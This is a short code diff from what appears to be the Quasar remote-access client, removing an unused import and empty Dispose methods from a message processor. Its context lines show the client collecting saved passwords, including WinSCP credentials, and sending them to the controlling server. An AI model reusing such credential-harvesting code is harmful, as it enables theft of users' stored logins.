@@ -3,7 +3,6 @@ using Quasar.Client.Recovery.FtpClients;
 using Quasar.Common.Messages;
 using Quasar.Common.Models;
 using Quasar.Common.Networking;
-using System;
 using System.Collections.Generic;
 
 namespace Quasar.Client.Messages
@@ -37,20 +36,6 @@ namespace Quasar.Client.Messages
             recovered.AddRange(WinSCP.GetSavedPasswords());
 
             client.Send(new GetPasswordsResponse { RecoveredAccounts = recovered });
-        }
-
-        /// <summary>
-        /// Disposes all managed and unmanaged resources associated with this message processor.
-        /// </summary>
-        public void Dispose()
-        {
-            Dispose(true);
-            GC.SuppressFinalize(this);
-        }
-
-        protected virtual void Dispose(bool disposing)
-        {
-
         }
     }
 }
